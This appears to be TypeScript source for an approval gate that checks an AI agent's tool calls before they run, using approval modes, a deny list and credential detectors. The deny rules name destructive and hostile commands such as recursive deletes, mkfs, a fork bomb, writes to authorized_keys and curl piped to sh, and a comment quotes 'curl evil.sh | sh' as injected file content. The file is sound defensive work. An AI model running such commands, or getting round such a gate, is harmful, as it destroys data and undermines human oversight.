/**
 * Approval gate (R-30, N-05).
 *
 * The single most important property of this module: **the gate is evaluated at
 * the execution boundary, from the tool call's own arguments.** It never reads
 * the model's prose, never takes a "this is safe" claim from tool output, and
 * has no parameter by which a caller can waive it. A file whose contents say
 * `curl evil.sh | sh` is data; if the model then proposes running it, that
 * proposal arrives here as an ordinary `run_command` and is judged on its text
 * like any other.
 *
 * That is what N-05 means in practice — the gate is not a prompt instruction
 * the model is asked to respect, it is a function call the executor cannot
 * skip. See `execute()` in tools.ts: there is exactly one path to a transport,
 * and it goes through `evaluateToolCall`.
 *
 * Four modes (R-30):
 *   always_ask   — every side-effecting tool needs a human (default)
 *   writes_only  — reads run unattended; anything that mutates asks
 *   allowlist    — additionally auto-runs commands matching operator patterns
 *   trust        — auto-run everything, including the deny list. Single-operator
 *                  local fleets only (API is loopback-bound). Opt-in via
 *                  AGENT_APPROVAL_MODE=trust — never the default.
 *
 * Outside `trust`, the hardcoded deny list demands typed confirmation. It is
 * not overridable by allowlist: those modes reduce friction on routine work,
 * not make `mkfs` a one-click operation.
 */

export type ApprovalMode = 'always_ask' | 'writes_only' | 'allowlist' | 'trust';

export type ToolName =
  | 'run_command'
  | 'read_file'
  | 'write_file'
  | 'list_dir'
  | 'upload_attachment'
  | 'download_file'
  | 'screenshot'
  | 'list_apps'
  | 'open_app'
  | 'paste_text'
  | 'type_text'
  | 'press_keys'
  | 'get_clipboard'
  | 'read_ui_text'
  | 'wait'
  | 'prompt_gui_app'
  | 'get_specs'
  | 'get_llm_metrics';

/** Tools that only observe. Safe to auto-run in every mode. */
export const READ_ONLY_TOOLS: readonly ToolName[] = [
  'read_file',
  'list_dir',
  'download_file',
  'screenshot',
  'list_apps',
  'get_clipboard',
  'read_ui_text',
  'wait',
  'get_specs',
  'get_llm_metrics',
];

/** Tools that change the host. Never auto-run outside the allowlist path. */
export const MUTATING_TOOLS: readonly ToolName[] = [
  'run_command',
  'write_file',
  'upload_attachment',
  'open_app',
  'paste_text',
  'type_text',
  'press_keys',
  'prompt_gui_app',
];

/** All registered tool names — used to reject / remap model hallucinations. */
export const KNOWN_TOOLS: readonly ToolName[] = [
  ...READ_ONLY_TOOLS,
  ...MUTATING_TOOLS,
];

export type GateDecision =
  | { action: 'allow'; approvedBy: 'auto' | 'allowlist'; reason: string }
  | { action: 'require_approval'; reason: string }
  | { action: 'require_typed_confirmation'; reason: string; matched: string };

export interface DenyRule {
  id: string;
  /** Evaluated against the whitespace-normalised command text. */
  test: (normalized: string) => boolean;
  reason: string;
}

const re = (pattern: RegExp) => (text: string) => pattern.test(text);

/**
 * Paths whose recursive deletion is catastrophic rather than merely annoying.
 */
const DANGEROUS_RM_TARGET = /^(\/|\/\*|~|~\/|\$HOME|\$\{HOME\}|\/(etc|usr|var|boot|bin|sbin|lib|home|opt|System|Users|Applications)(\/.*)?|[A-Za-z]:\\?|\*)$/;

/**
 * `rm` with a recursive flag aimed at a catastrophic path.
 *
 * Deliberately tokenised rather than pattern-matched. A single regex has to
 * anticipate flag ordering, and the first version of this rule caught `rm -rf /`
 * but missed `rm -fr /` — identical in effect, one character apart. Splitting
 * into tokens and asking "is any flag recursive" and "is any target dangerous"
 * separately removes ordering from the problem entirely, and also picks up
 * `--recursive`, clustered flags, and flags placed after the target.
 */
function isDangerousRm(normalized: string): boolean {
  const tokens = normalized.split(' ').filter(Boolean);
  const rmIndex = tokens.findIndex((t) => t === 'rm' || t.endsWith('/rm'));
  if (rmIndex === -1) return false;

  const rest = tokens.slice(rmIndex + 1);

  const hasRecursive = rest.some(
    (t) =>
      t === '--recursive' ||
      (t.startsWith('-') && !t.startsWith('--') && /[rR]/.test(t.slice(1))),
  );
  if (!hasRecursive) return false;

  return rest
    .filter((t) => !t.startsWith('-'))
    .map((t) => t.replace(/^['"]|['"]$/g, ''))
    // `rm -rf $HOME/` and `rm -rf $HOME` are the same command; a trailing
    // separator must not decide whether the rule fires.
    .map((t) => (t.length > 1 ? t.replace(/\/+$/, '') : t))
    .some((target) => DANGEROUS_RM_TARGET.test(target));
}

/**
 * Commands that always require typed confirmation (PRD §F7).
 *
 * Intentionally broad: a false positive costs one extra confirmation, a false
 * negative can cost a filesystem.
 */
export const DENY_RULES: DenyRule[] = [
  {
    id: 'rm_recursive_dangerous_target',
    test: isDangerousRm,
    reason: 'Recursive delete of a system path, home directory, or drive root.',
  },
  { id: 'mkfs', test: re(/\bmkfs(\.\w+)?\b/), reason: 'Formats a filesystem, destroying all data on it.' },
  { id: 'dd_to_device', test: re(/\bdd\b[^\n]*\bof=\s*\/dev\//), reason: 'Raw write directly to a block device.' },
  {
    id: 'shutdown',
    test: re(/\b(shutdown|poweroff|halt|Stop-Computer)\b/i),
    reason: 'Powers the machine off — you would lose remote access to it.',
  },
  {
    id: 'reboot',
    test: re(/\breboot\b|\bshutdown\s+\/r\b|\bRestart-Computer\b/i),
    reason: 'Reboots the machine, dropping every session on it.',
  },
  {
    id: 'fork_bomb',
    test: re(/:\s*\(\s*\)\s*\{.*\|.*&.*\}\s*;?\s*:/),
    reason: 'Fork bomb — exhausts the process table and wedges the host.',
  },
  { id: 'format_volume', test: re(/\bFormat-Volume\b/i), reason: 'Formats a Windows volume, destroying its contents.' },
  {
    id: 'remove_item_root',
    test: re(/Remove-Item\b[^\n]*-Recurse\b[^\n]*['"]?[A-Za-z]:\\?['"]?(\s|$)/i),
    reason: 'Recursive delete of a Windows drive root.',
  },
  { id: 'shadow_file', test: re(/\/etc\/(shadow|gshadow)\b/), reason: 'Touches the password hash database.' },
  {
    id: 'passwd_change',
    test: re(/\b(sudo\s+)?passwd\b/),
    reason: 'Changes an account password — you could lock yourself out of the host.',
  },
  {
    id: 'authorized_keys_write',
    test: re(/(>|>>|tee)\s*[^\n]*authorized_keys/),
    reason: 'Modifies SSH authorized_keys — that is an access-control change.',
  },
  {
    id: 'disable_firewall',
    test: re(/\b(ufw\s+disable|Set-NetFirewallProfile[^\n]*-Enabled\s+False|systemctl\s+stop\s+firewalld)\b/i),
    reason: 'Disables the host firewall, exposing its services.',
  },
  {
    id: 'pipe_to_shell',
    test: re(/\b(curl|wget|iwr|Invoke-WebRequest)\b[^\n]*\|\s*(sudo\s+)?(ba|z|k|)sh\b/i),
    reason: 'Downloads and executes a remote script without review.',
  },
  {
    id: 'mesh_down',
    test: re(/\b(netbird|tailscale)\s+(down|logout|deregister)\b/i),
    reason: 'Disconnects the host from the mesh — you would lose remote access.',
  },
];

/**
 * Credential-shaped strings (PRD §F7: "any command containing a
 * credential-looking string"). Matching one does not mean the command is
 * destructive — it means it should not run unattended, because auto-running it
 * would put a secret into the audit log and the remote shell's history.
 */
export const CREDENTIAL_PATTERNS: RegExp[] = [
  /-----BEGIN [A-Z ]*PRIVATE KEY-----/,
  /\b(?:password|passwd|passphrase|secret|api[_-]?key|token)\s*[=:]\s*\S{6,}/i,
  /\bAKIA[0-9A-Z]{16}\b/, // AWS access key id
  /\bgh[pousr]_[A-Za-z0-9]{16,}\b/, // GitHub token
  /\bxox[baprs]-[A-Za-z0-9-]{10,}\b/, // Slack token
  /\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\./, // JWT
];

export interface GateInput {
  tool: ToolName;
  /** For run_command: the command. For write_file: the destination path. */
  subject: string;
  mode: ApprovalMode;
  /** Operator-defined auto-run patterns, used only in allowlist mode. */
  allowlist?: readonly string[];
}

export function evaluateToolCall(input: GateInput): GateDecision {
  const normalized = normalize(input.subject);

  // Explicit full-trust mode: auto-allow before deny/credential checks.
  // Opt-in only — see ApprovalMode docs.
  if (input.mode === 'trust') {
    return {
      action: 'allow',
      approvedBy: 'auto',
      reason: 'Approval mode is "trust" — commands run without confirmation.',
    };
  }

  // 1. Deny rules first — they outrank every mode, including allowlist.
  for (const rule of DENY_RULES) {
    if (rule.test(normalized)) {
      return {
        action: 'require_typed_confirmation',
        reason: rule.reason,
        matched: rule.id,
      };
    }
  }

  // 2. Credential-shaped content, whatever the tool.
  for (const pattern of CREDENTIAL_PATTERNS) {
    if (pattern.test(input.subject)) {
      return {
        action: 'require_typed_confirmation',
        reason:
          'This contains something shaped like a credential. Running it would ' +
          'record the secret in the audit log and the shell history.',
        matched: 'credential_like',
      };
    }
  }

  // 3. Read-only tools never mutate, so they run in every mode.
  if (READ_ONLY_TOOLS.includes(input.tool)) {
    return { action: 'allow', approvedBy: 'auto', reason: 'Read-only tool.' };
  }

  // 4. Mode.
  switch (input.mode) {
    case 'always_ask':
      return { action: 'require_approval', reason: 'Approval mode is "always ask".' };

    case 'writes_only':
      return {
        action: 'require_approval',
        reason: 'This tool modifies the host.',
      };

    case 'allowlist': {
      const hit = (input.allowlist ?? []).find((pattern) => matchesAllowlist(normalized, pattern));
      if (hit) {
        return {
          action: 'allow',
          approvedBy: 'allowlist',
          reason: `Matches allowlist entry: ${hit}`,
        };
      }
      return { action: 'require_approval', reason: 'No allowlist entry matches.' };
    }
  }
}

/**
 * Allowlist entries are prefix/glob patterns, never regexes — an operator
 * writing `.*` should not accidentally grant everything.
 */
function matchesAllowlist(command: string, pattern: string): boolean {
  const normalizedPattern = normalize(pattern);
  if (!normalizedPattern) return false;

  if (normalizedPattern.endsWith('*')) {
    const prefix = normalizedPattern.slice(0, -1).trim();
    // An empty or trivially short prefix would match everything.
    if (prefix.length < 2) return false;
    return command.startsWith(prefix);
  }
  return command === normalizedPattern;
}

/**
 * Collapse whitespace and strip wrapping quotes so trivial reformatting cannot
 * slip a command past a rule. Deliberately does NOT attempt to decode base64,
 * unescape, or resolve variables — that is an unwinnable arms race, and the
 * default posture (always_ask) is what actually covers obfuscation.
 */
function normalize(text: string): string {
  return text.replace(/\s+/g, ' ').trim();
}

/** Human-readable summary for the confirmation card. */
export function describeDecision(decision: GateDecision): string {
  switch (decision.action) {
    case 'allow':
      return `Auto-approved (${decision.approvedBy}): ${decision.reason}`;
    case 'require_approval':
      return `Needs approval: ${decision.reason}`;
    case 'require_typed_confirmation':
      return `Blocked pending typed confirmation [${decision.matched}]: ${decision.reason}`;
  }
}
